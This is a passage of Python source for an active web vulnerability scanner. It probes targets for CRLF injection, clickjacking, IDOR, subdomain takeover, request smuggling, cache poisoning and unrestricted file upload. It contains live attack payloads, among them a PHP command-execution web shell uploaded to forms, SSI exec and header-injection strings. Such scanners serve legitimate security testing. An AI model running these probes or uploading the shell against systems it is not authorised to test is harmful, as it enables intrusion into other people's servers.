            all_headers = ' '.join(f"{k}: {v}" for k, v in r.headers.items())
            for pattern in self.SENSITIVE_HEADER_PATTERNS:
                m = pattern.search(all_headers)
                if m:
                    findings.append({
                        'type':        'INFO_DISCLOSURE_VERSION',
                        'severity':    'LOW',
                        'confidence':  'HIGH',
                        'url':         url,
                        'description': f'Server version disclosed in response headers',
                        'evidence':    m.group()[:100],
                        'remediation': 'Remove Server, X-Powered-By, and X-AspNet-Version headers.',
                    })
                    break

            # Internal IP in response
            m = self.INTERNAL_IP.search(body)
            if m:
                findings.append({
                    'type':        'INFO_DISCLOSURE_INTERNAL_IP',
                    'severity':    'MEDIUM',
                    'confidence':  'MEDIUM',
                    'url':         url,
                    'description': 'Internal IP address leaked in response',
                    'evidence':    f'Found: {m.group()}',
                    'remediation': 'Remove internal IPs from responses. Use a WAF or reverse proxy.',
                })

            # Trigger error on known params
            if params:
                error_payload = "'"
                for param in params[:3]:
                    try:
                        re2 = self.session.get(
                            _build_url(url, param, error_payload),
                            timeout=self.timeout, verify=False
                        )
                        body2 = re2.text[:5000]
                        for pattern in self.STACK_TRACE_PATTERNS:
                            if pattern.search(body2):
                                findings.append({
                                    'type':        'INFO_DISCLOSURE_ERROR_MSG',
                                    'severity':    'MEDIUM',
                                    'confidence':  'HIGH',
                                    'url':         _build_url(url, param, error_payload),
                                    'param':       param,
                                    'description': f'Verbose error message via param "{param}"',
                                    'evidence':    f'Pattern {pattern.pattern[:60]!r} in error response',
                                    'remediation': 'Configure generic error pages. Disable debug mode.',
                                })
                                break
                    except Exception:
                        pass

        except Exception:
            pass
        return findings


# =============================================================================
# 11. CRLF / HEADER INJECTION
# =============================================================================

class CRLFChecker:
    """
    Detects CRLF injection by injecting newlines into parameters and checking
    if injected headers appear in the HTTP response.
    """

    CRLF_CANARY = "JSScoutInjectedHeader"
    PAYLOADS = [
        f"\r\nX-Injected: {CRLF_CANARY}",
        f"%0d%0aX-Injected: {CRLF_CANARY}",
        f"%0aX-Injected: {CRLF_CANARY}",
        f"\nX-Injected: {CRLF_CANARY}",
        f"%0d%0a%20X-Injected: {CRLF_CANARY}",
        f"a%0d%0aSet-Cookie:CRLF={CRLF_CANARY}",
    ]

    def __init__(self, session, timeout=8):
        self.session = session
        self.timeout = timeout

    def check(self, url, params):
        findings = []
        for param in params[:12]:
            for payload in self.PAYLOADS:
                try:
                    r = self.session.get(
                        _build_url(url, param, payload),
                        timeout=self.timeout, verify=False, allow_redirects=False
                    )
                    # Check if canary appears in any header
                    all_resp_headers = ' '.join(f"{k}: {v}" for k, v in r.headers.items())
                    if self.CRLF_CANARY in all_resp_headers:
                        findings.append({
                            'type':        'CRLF_INJECTION',
                            'severity':    'HIGH',
                            'confidence':  'HIGH',
                            'url':         _build_url(url, param, payload),
                            'param':       param,
                            'payload':     payload,
                            'description': f'CRLF Injection via "{param}" — attacker-controlled HTTP headers',
                            'evidence':    f'Injected header "{self.CRLF_CANARY}" found in response headers',
                            'remediation': 'Strip CRLF (\\r\\n) from all user input used in HTTP headers.',
                        })
                        break
                except Exception:
                    pass
            if findings and findings[-1].get('param') == param:
                continue
        return findings


# =============================================================================
# 12. CLICKJACKING
# =============================================================================

class ClickjackingChecker:
    """
    Checks if the page is embeddable in an iframe (no X-Frame-Options / CSP frame-ancestors).
    Distinguishes between missing and deliberately allowing.
    """

    def __init__(self, session, timeout=8):
        self.session = session
        self.timeout = timeout

    def check(self, url):
        try:
            r = self.session.get(url, timeout=self.timeout, verify=False)
            xfo = r.headers.get('X-Frame-Options', '').upper()
            csp = r.headers.get('Content-Security-Policy', '')
            fa  = re.search(r"frame-ancestors\s+[^;]+", csp, re.I)

            if not xfo and not fa:
                ct = r.headers.get('Content-Type', '')
                if 'html' in ct.lower():
                    return {
                        'type':        'CLICKJACKING',
                        'severity':    'MEDIUM',
                        'confidence':  'HIGH',
                        'url':         url,
                        'description': 'Page can be embedded in an iframe — clickjacking possible',
                        'evidence':    'Neither X-Frame-Options nor CSP frame-ancestors present',
                        'remediation': "Add: X-Frame-Options: DENY or CSP: frame-ancestors 'none'",
                    }
            elif xfo not in ('DENY', 'SAMEORIGIN') and not fa:
                return {
                    'type':        'CLICKJACKING_WEAK',
                    'severity':    'LOW',
                    'confidence':  'HIGH',
                    'url':         url,
                    'description': f'X-Frame-Options set to weak value: {xfo!r}',
                    'evidence':    f'X-Frame-Options: {xfo}',
                    'remediation': "Use X-Frame-Options: DENY or CSP frame-ancestors 'none'",
                }
        except Exception:
            pass
        return None


# =============================================================================
# 13. IDOR / BROKEN OBJECT LEVEL AUTH
# =============================================================================

class IDORChecker:
    """
    Detects IDOR by identifying numeric IDs in URL paths and parameters,
    then testing adjacent IDs (id±1, id±2) for different response content.
    Reports when an adjacent ID returns data (not 403/404) without authentication change.
    """

    ID_IN_PATH   = re.compile(r'/(\d{1,12})(?:/|$|\?)')
    ID_IN_PARAM  = re.compile(r'(?:id|user_id|account|profile|order|item|doc|file|record)=(\d{1,12})', re.I)

    def __init__(self, session, timeout=8):
        self.session = session
        self.timeout = timeout

    def check(self, urls):
        findings = []
        seen_bases = set()

        for url in urls:
            base_key = re.sub(r'\d+', 'N', url)
            if base_key in seen_bases:
                continue
            seen_bases.add(base_key)

            f = self._test_url(url)
            if f:
                findings.append(f)

        return findings

    def _test_url(self, url):
        # Find a numeric ID to test
        parsed = urlparse(url)
        path_match  = self.ID_IN_PATH.search(parsed.path)
        query_match = self.ID_IN_PARAM.search(parsed.query)

        if path_match:
            orig_id = int(path_match.group(1))
            adj_id  = orig_id + 1
            test_url = url.replace(f'/{orig_id}/', f'/{adj_id}/', 1)
            test_url = test_url.replace(f'/{orig_id}', f'/{adj_id}', 1)
        elif query_match:
            orig_id = int(query_match.group(1))
            adj_id  = orig_id + 1
            param_name = query_match.group(0).split('=')[0]
            test_url = re.sub(rf'{param_name}=\d+', f'{param_name}={adj_id}', url, count=1)
        else:
            return None

        try:
            r_orig = self.session.get(url, timeout=self.timeout, verify=False)
            r_adj  = self.session.get(test_url, timeout=self.timeout, verify=False)

            # Both must return 200-series data responses
            if r_orig.status_code not in range(200, 300):
                return None
            if r_adj.status_code not in range(200, 300):
                return None

            # The adjacent response must have actual content (not empty redirect)
            if len(r_adj.text) < 50:
                return None

            # Content must differ (otherwise it's just a generic page)
            diff = abs(len(r_adj.text) - len(r_orig.text))
            if diff < 20 and r_adj.text[:200] == r_orig.text[:200]:
                return None

            return {
                'type':        'IDOR',
                'severity':    'HIGH',
                'confidence':  'MEDIUM',
                'url':         test_url,
                'original_url': url,
                'original_id': orig_id,
                'tested_id':   adj_id,
                'description': f'Possible IDOR — adjacent ID {adj_id} returns data without auth change',
                'evidence':    f'ID {orig_id}→{adj_id}: status {r_adj.status_code}, {len(r_adj.text)}B response',
                'remediation': 'Implement object-level authorization. Verify ownership on every request.',
            }
        except Exception:
            pass
        return None


# =============================================================================
# 14. SUBDOMAIN TAKEOVER (fingerprinting)
# =============================================================================

class SubdomainTakeoverChecker:
    """
    Checks CNAME-resolved subdomains for takeover signatures.
    Tests if the current domain's DNS points to a service that can be claimed.
    """

    # Signature → (service_name, confidence)
    TAKEOVER_SIGNATURES = {
        "There is no app here":                   ("Heroku",       "HIGH"),
        "No such app":                            ("Heroku",       "HIGH"),
        "herokucdn.com":                          ("Heroku CDN",   "MEDIUM"),
        "Repository not found":                   ("GitHub Pages", "HIGH"),
        "The site you were looking for.*doesn":   ("GitHub Pages", "HIGH"),
        "Fastly error: unknown domain":           ("Fastly",       "HIGH"),
        "This UserVoice subdomain is currently available": ("UserVoice", "HIGH"),
        "Domain not configured":                  ("Squarespace",  "HIGH"),
        "404 Blog is not found":                  ("Tumblr",       "HIGH"),
        "Do you want to register":                ("Wordpress",    "MEDIUM"),
        "The feed has not been found":            ("Feedburner",   "HIGH"),
        "Ghost blog":                             ("Ghost",        "MEDIUM"),
        "Used to be here":                        ("Bitbucket",    "HIGH"),
        "The page you're looking for doesn":      ("Shopify",      "HIGH"),
        "This shop is currently unavailable":     ("Shopify",      "HIGH"),
        "azure websites":                         ("Azure",        "MEDIUM"),
        "azurefd.net.*does not exist":            ("Azure FD",     "HIGH"),
        "No settings were found for this company":("Zendesk",      "HIGH"),
        "Help Center Closed":                     ("Zendesk",      "HIGH"),
    }

    def __init__(self, session, timeout=8):
        self.session = session
        self.timeout = timeout

    def check(self, base_url, subdomains=None):
        findings = []
        urls_to_check = [base_url] + [f"https://{s}" for s in (subdomains or [])]

        for url in urls_to_check[:20]:
            try:
                r = self.session.get(url, timeout=self.timeout, verify=False,
                                      allow_redirects=True)
                body = r.text[:3000]
                for sig_pattern, (service, confidence) in self.TAKEOVER_SIGNATURES.items():
                    if re.search(sig_pattern, body, re.I):
                        findings.append({
                            'type':        'SUBDOMAIN_TAKEOVER',
                            'severity':    'HIGH',
                            'confidence':  confidence,
                            'url':         url,
                            'service':     service,
                            'description': f'Possible subdomain takeover via {service}',
                            'evidence':    f'Signature matched: {sig_pattern[:60]!r}',
                            'remediation': f'Remove dangling DNS CNAME or claim the {service} resource.',
                        })
                        break
            except Exception:
                pass
        return findings


# =============================================================================
# 15. HTTP REQUEST SMUGGLING (fingerprint)
# =============================================================================

class RequestSmugglingChecker:
    """
    Fingerprints for potential HTTP request smuggling conditions by:
    1. Sending ambiguous CL+TE headers and checking for timing/response anomalies
    2. Checking server version (certain versions have known vulnerabilities)
    Only MEDIUM confidence — full confirmation requires manual testing.
    """

    def __init__(self, session, timeout=10):
        self.session = session
        self.timeout = timeout

    def check(self, base_url):
        findings = []

        # 1. CL.TE probe: send a request with both Content-Length and Transfer-Encoding
        try:
            # A minimal CL.TE desync probe
            raw_body = "0\r\n\r\n"
            r = self.session.post(
                base_url,
                data=raw_body,
                headers={
                    'Content-Length': '6',
                    'Transfer-Encoding': 'chunked',
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                timeout=self.timeout,
                verify=False,
                allow_redirects=False,
            )
            # If server returns 400 specifically mentioning chunked/CL conflict
            body = r.text[:1000]
            server = r.headers.get('Server', '')
            if r.status_code == 400 and ('transfer-encoding' in body.lower() or
                                          'content-length' in body.lower()):
                findings.append({
                    'type':        'REQUEST_SMUGGLING_CL_TE',
                    'severity':    'HIGH',
                    'confidence':  'LOW',
                    'url':         base_url,
                    'description': 'Possible CL.TE request smuggling — server rejects ambiguous framing',
                    'evidence':    f'HTTP 400 with header conflict message. Server: {server}',
                    'remediation': 'Upgrade to HTTP/2. Configure front-end and back-end to use same framing.',
                })
        except Exception:
            pass

        # 2. Server version fingerprint for known-vulnerable versions
        try:
            r2 = self.session.get(base_url, timeout=self.timeout, verify=False)
            server = r2.headers.get('Server', '')
            via    = r2.headers.get('Via', '')
            # Known vulnerable: Apache httpd < 2.4.51, nginx < 1.21.1
            apache_m = re.search(r'Apache/(\d+\.\d+\.\d+)', server)
            nginx_m  = re.search(r'nginx/(\d+\.\d+\.\d+)', server)
            if apache_m:
                ver = apache_m.group(1)
                parts = [int(x) for x in ver.split('.')]
                if parts < [2, 4, 51]:
                    findings.append({
                        'type':        'REQUEST_SMUGGLING_VERSION',
                        'severity':    'MEDIUM',
                        'confidence':  'LOW',
                        'url':         base_url,
                        'description': f'Apache {ver} may be vulnerable to request smuggling (CVE-2021-41524)',
                        'evidence':    f'Server: {server}',
                        'remediation': 'Upgrade Apache to >= 2.4.51.',
                    })
        except Exception:
            pass

        return findings


# =============================================================================
# 16. CACHE POISONING
# =============================================================================

class CachePoisoningChecker:
    """
    Tests for web cache poisoning by injecting values in unkeyed headers
    and checking if they are reflected in cached responses.
    """

    CACHE_HEADERS_TO_TEST = [
        ('X-Forwarded-Host',   'evil.jsscout.test'),
        ('X-Forwarded-Scheme', 'nothttps'),
        ('X-Original-URL',     '/admin'),
        ('X-Rewrite-URL',      '/admin'),
        ('X-Host',             'evil.jsscout.test'),
    ]

    def __init__(self, session, timeout=8):
        self.session = session
        self.timeout = timeout

    def check(self, url):
        findings = []
        try:
            r_baseline = self.session.get(url, timeout=self.timeout, verify=False)
            baseline_body = r_baseline.text[:5000]
        except Exception:
            return findings

        for header_name, header_val in self.CACHE_HEADERS_TO_TEST:
            try:
                r = self.session.get(url, headers={header_name: header_val},
                                      timeout=self.timeout, verify=False)
                if header_val in r.text and header_val not in baseline_body:
                    findings.append({
                        'type':        'CACHE_POISONING',
                        'severity':    'HIGH',
                        'confidence':  'MEDIUM',
                        'url':         url,
                        'header':      f'{header_name}: {header_val}',
                        'description': f'Cache poisoning via unkeyed header {header_name!r}',
                        'evidence':    f'Value "{header_val}" reflected in response when sent via {header_name}',
                        'remediation': 'Add injected headers to cache key, or strip them at the edge.',
                    })
            except Exception:
                pass

        return findings


# =============================================================================
# 17. FILE UPLOAD SECURITY
# =============================================================================

class FileUploadChecker:
    """
    Tests file upload endpoints for:
    - Accepting dangerous MIME types (PHP, shell scripts)
    - Missing file type validation
    - Path traversal in filename parameter
    """

    DANGEROUS_FILES = [
        ("shell.php",    b"<?php system($_GET['cmd']); ?>", "application/x-php",  "PHP webshell"),
        ("shell.php5",   b"<?php echo 'jsscout_upload'; ?>", "application/x-php", "PHP5 webshell"),
        ("shell.phtml",  b"<?php echo 'jsscout_upload'; ?>", "text/plain",         "PHTML shell"),
        ("shell.shtml",  b"<!--#exec cmd='id'-->",           "text/plain",         "SSI injection"),
        ("test.php.jpg", b"<?php echo 'jsscout'; ?>",        "image/jpeg",         "Double extension bypass"),
        ("shell.html",   b"<script>alert(1)</script>",        "text/html",          "HTML upload XSS"),
    ]

    UPLOAD_PARAM_PATTERNS = re.compile(
        r'(file|upload|attachment|image|photo|avatar|document|import)', re.I
    )

    def __init__(self, session, timeout=10):
        self.session = session
        self.timeout = timeout

    def check(self, forms, base_url):
        """
        forms: list of {'action': url, 'method': str, 'inputs': [{'name':..., 'type':...}]}
        """
        findings = []
        upload_forms = [f for f in forms
                        if any(i.get('type') == 'file' for i in f.get('inputs', []))]

        for form in upload_forms[:5]:
            action = form.get('action', base_url)
            file_inputs = [i for i in form.get('inputs', []) if i.get('type') == 'file']

            for file_input in file_inputs[:2]:
                input_name = file_input.get('name', 'file')
                for fname, content, ctype, desc in self.DANGEROUS_FILES[:3]:
                    try:
                        files = {input_name: (fname, content, ctype)}
                        r = self.session.post(action, files=files,
                                               timeout=self.timeout, verify=False)
                        if r.status_code in (200, 201, 202):
                            if b'jsscout' in r.content or fname.split('.')[0] in r.text:
                                findings.append({
                                    'type':        'FILE_UPLOAD_UNRESTRICTED',
                                    'severity':    'CRITICAL',
                                    'confidence':  'HIGH',
                                    'url':         action,
                                    'description': f'Unrestricted file upload — {desc} accepted',
                                    'evidence':    f'Server accepted {fname} with status {r.status_code}',
                                    'remediation': 'Validate file type by content (not extension). Store outside webroot. Rename on server.',
                                })
                            else:
                                findings.append({
                                    'type':        'FILE_UPLOAD_ACCEPTED',
                                    'severity':    'MEDIUM',
                                    'confidence':  'MEDIUM',
                                    'url':         action,
                                    'description': f'Server accepted dangerous file type: {fname} ({desc})',
                                    'evidence':    f'Upload returned {r.status_code} — manual verification needed',
                                    'remediation': 'Validate file type using magic bytes, not extension or MIME.',
                                })
                        break
                    except Exception:
                        pass

        return findings


# =============================================================================
# MAIN ADVANCED VULNERABILITY CHECKER (orchestrator)
# =============================================================================

class AdvancedVulnChecker:
    """
    Orchestrates all advanced vulnerability checks.
    Integrates with JSScout Pro's existing results dict.
    """

    def __init__(self, target_url, session=None, threads=8, timeout=10, log_fn=None):
        if '://' not in target_url:
            target_url = 'https://' + target_url
        self.target_url = target_url.rstrip('/')
        self.base_domain = urlparse(target_url).netloc
        self.threads  = threads
        self.timeout  = timeout
        self.log      = log_fn or print

        self.session = session or requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                          'AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36',
        })

        # Initialise checkers
        self.sqli_checker       = SQLiChecker(self.session, timeout)
        self.ssti_checker       = SSTIChecker(self.session, timeout)
        self.cmdi_checker       = CommandInjectionChecker(self.session, timeout)
        self.lfi_checker        = PathTraversalChecker(self.session, timeout)
        self.xxe_checker        = XXEChecker(self.session, timeout)
        self.ssrf_checker       = SSRFChecker(self.session, timeout)
        self.jwt_checker        = JWTChecker(self.session, timeout)
        self.graphql_checker    = GraphQLChecker(self.session, timeout)
        self.headers_checker    = SecurityHeadersChecker(self.session, timeout)
        self.info_checker       = InfoDisclosureChecker(self.session, timeout)
        self.crlf_checker       = CRLFChecker(self.session, timeout)
        self.clickjack_checker  = ClickjackingChecker(self.session, timeout)
        self.idor_checker       = IDORChecker(self.session, timeout)
        self.takeover_checker   = SubdomainTakeoverChecker(self.session, timeout)
        self.smuggling_checker  = RequestSmugglingChecker(self.session, timeout)
        self.cache_checker      = CachePoisoningChecker(self.session, timeout)
        self.upload_checker     = FileUploadChecker(self.session, timeout)

        self.findings = defaultdict(list)

    def run_all(self, urls_to_check=None, param_map=None, forms=None,
                cookies=None, response_bodies=None, subdomains=None):
        """
        Run all advanced vulnerability checks.
        urls_to_check: list of same-domain URLs discovered by crawler
        param_map:     dict {url: [param1, param2, ...]}
        forms:         list of form dicts from crawler
        cookies:       dict of cookies from session
        response_bodies: list of response body strings for JWT hunting
        """
        urls = list(set([self.target_url] + (urls_to_check or [])))
        param_map = param_map or {}
        forms = forms or []
        cookies = dict(cookies or {})
        response_bodies = response_bodies or []

        # Build a flat list of (url, [params]) pairs for injection testing
        url_param_pairs = []
        for url in urls[:50]:
            params = list(param_map.get(url, []))
            # Also extract params from URL query string
            qs_params = list(parse_qs(urlparse(url).query).keys())
            all_params = list(dict.fromkeys(params + qs_params))
            if all_params:
                url_param_pairs.append((url, all_params))

        # Collect all params across all URLs for base URL testing
        all_params_flat = list(dict.fromkeys(
            p for _, params in url_param_pairs for p in params
        ))

        self.log("\n[*] Advanced Vuln: Security Headers...")
        hdr_f = self.headers_checker.check(self.target_url)
        self.findings['security_headers'].extend(hdr_f)
        self.log(f"  [+] Security headers: {len(hdr_f)} issues")

        self.log("[*] Advanced Vuln: Clickjacking...")
        cj = self.clickjack_checker.check(self.target_url)
        if cj:
            self.findings['clickjacking'].append(cj)
            self.log(f"  [CLICKJACKING] {cj['severity']} — {cj['url']}")

        self.log("[*] Advanced Vuln: Information Disclosure...")
        for url, params in url_param_pairs[:20]:
            info_f = self.info_checker.check(url, params)
            self.findings['info_disclosure'].extend(info_f)
        self.log(f"  [+] Info disclosure: {len(self.findings['info_disclosure'])} findings")

        self.log("[*] Advanced Vuln: GraphQL Security...")
        gql_f = self.graphql_checker.check(self.target_url)
        self.findings['graphql'].extend(gql_f)
        for f in gql_f:
            self.log(f"  [GRAPHQL] {f['severity']} — {f['type']} @ {f['url'][:70]}")

        self.log("[*] Advanced Vuln: Cache Poisoning...")
        for url in urls[:10]:
            cp_f = self.cache_checker.check(url)
            self.findings['cache_poisoning'].extend(cp_f)
        if self.findings['cache_poisoning']:
            self.log(f"  [+] Cache poisoning: {len(self.findings['cache_poisoning'])} findings")

        self.log("[*] Advanced Vuln: Request Smuggling fingerprint...")
        smug_f = self.smuggling_checker.check(self.target_url)
        self.findings['request_smuggling'].extend(smug_f)
        if smug_f:
            self.log(f"  [!] Smuggling indicators: {len(smug_f)}")

        self.log("[*] Advanced Vuln: JWT Security...")
        auth_headers = []
        jwt_f = self.jwt_checker.check(self.target_url, cookies, auth_headers, response_bodies)
        self.findings['jwt'].extend(jwt_f)
        for f in jwt_f:
            self.log(f"  [JWT] {f['severity']} — {f['type']}")

        self.log("[*] Advanced Vuln: Subdomain Takeover check...")
        st_f = self.takeover_checker.check(self.target_url, subdomains)
        self.findings['subdomain_takeover'].extend(st_f)
        for f in st_f:
            self.log(f"  [TAKEOVER] {f['severity']} — {f['description']}")

        self.log("[*] Advanced Vuln: File Upload Security...")
        if forms:
            fu_f = self.upload_checker.check(forms, self.target_url)
            self.findings['file_upload'].extend(fu_f)
            if fu_f:
                self.log(f"  [!] File upload: {len(fu_f)} findings")

        # ── Injection checks (parallelised per URL) ────────────────────────────
        self.log(f"[*] Advanced Vuln: Injection checks on {len(url_param_pairs)} URL+param pairs...")

        inject_lock = threading.Lock()

        def run_injections(url, params):
            local = defaultdict(list)
            # SQLi
            sqli = self.sqli_checker.check(url, params)
            for f in sqli:
                local['sqli'].append(f)
                self.log(f"  [SQLi]    {f['severity']} ({f['confidence']}) — param={f['param']} @ {url[:70]}")
                self.log(f"            {f['evidence'][:120]}")
            # SSTI
            ssti = self.ssti_checker.check(url, params)
            for f in ssti:
                local['ssti'].append(f)
                self.log(f"  [SSTI]    {f['severity']} — param={f['param']} payload={f['payload']!r} @ {url[:70]}")
            # Command injection
            cmdi = self.cmdi_checker.check(url, params)
            for f in cmdi:
                local['command_injection'].append(f)
                self.log(f"  [CMDi]    {f['severity']} ({f['confidence']}) — param={f['param']} @ {url[:70]}")
            # Path traversal
            lfi = self.lfi_checker.check(url, params)
            for f in lfi:
                local['path_traversal'].append(f)
                self.log(f"  [LFI]     {f['severity']} — param={f['param']} @ {url[:70]}")
            # SSRF
            ssrf = self.ssrf_checker.check(url, params)
            for f in ssrf:
                local['ssrf'].append(f)
                self.log(f"  [SSRF]    {f['severity']} — param={f['param']} ssrf_type={f['ssrf_type']}")
            # CRLF
            crlf = self.crlf_checker.check(url, params)
            for f in crlf:
                local['crlf'].append(f)
                self.log(f"  [CRLF]    {f['severity']} — param={f['param']} @ {url[:70]}")
            # IDOR
            idor = self.idor_checker.check([url])
            for f in idor:
                local['idor'].append(f)
                self.log(f"  [IDOR]    {f['severity']} — ID {f['original_id']}→{f['tested_id']} @ {url[:70]}")
            # Info disclosure per-URL
            info = self.info_checker.check(url, params)
            for f in info:
                local['info_disclosure'].append(f)

            with inject_lock:
                for key, items in local.items():
                    self.findings[key].extend(items)

        # Run injection checks concurrently, but cap threads to avoid hammering
        max_workers = min(self.threads, 6)
        with ThreadPoolExecutor(max_workers=max_workers) as pool:
            futs = {pool.submit(run_injections, url, params): url
                    for url, params in url_param_pairs[:40]}
            cf_wait(futs, timeout=300)
            for f in futs:
                f.cancel()

        # XXE on XML-accepting endpoints
        self.log("[*] Advanced Vuln: XXE on XML endpoints...")
        xml_urls = [u for u in urls if any(kw in u for kw in ['/api/', '/xml', '/soap', '/rpc'])]
        xml_urls = [self.target_url] + xml_urls[:10]
        xxe_f = self.xxe_checker.check(xml_urls)
        self.findings['xxe'].extend(xxe_f)
        if xxe_f:
            self.log(f"  [!] XXE: {len(xxe_f)} findings")

        total = sum(len(v) for v in self.findings.values())
        critical = sum(1 for fl in self.findings.values() for f in fl if f.get('severity') == 'CRITICAL')
        high     = sum(1 for fl in self.findings.values() for f in fl if f.get('severity') == 'HIGH')
        self.log(f"\n[+] Advanced vuln checks complete: {total} findings "
                 f"({critical} CRITICAL, {high} HIGH)")

        return dict(self.findings)

    def get_summary(self):
        return {cat: len(items) for cat, items in self.findings.items()}


# =============================================================================
# STANDALONE CLI
# =============================================================================

def main():
    ap = argparse.ArgumentParser(description='JS Scout Advanced Vulnerability Scanner — standalone')
    ap.add_argument('target',    help='Target URL')
    ap.add_argument('--threads', type=int, default=8)
    ap.add_argument('--timeout', type=int, default=10)
    ap.add_argument('--output',  default='adv_vuln_output')
    args = ap.parse_args()

    checker = AdvancedVulnChecker(
        args.target,
        threads=args.threads,
        timeout=args.timeout,
    )

    results = checker.run_all()
    summary = checker.get_summary()

    out = Path(args.output)
    out.mkdir(parents=True, exist_ok=True)
    (out / 'advanced_findings.json').write_text(
        json.dumps(results, indent=2, default=str), encoding='utf-8'
    )

    print(f"\n{'='*60}")
    print(f"  JS Scout Advanced Scanner — Results for {args.target}")
    print(f"{'='*60}")
    for cat, count in sorted(summary.items(), key=lambda x: -x[1]):
        if count:
            print(f"  {cat:<30} {count}")
    print(f"\n  Full results: {out}/advanced_findings.json")


if __name__ == '__main__':
    main()
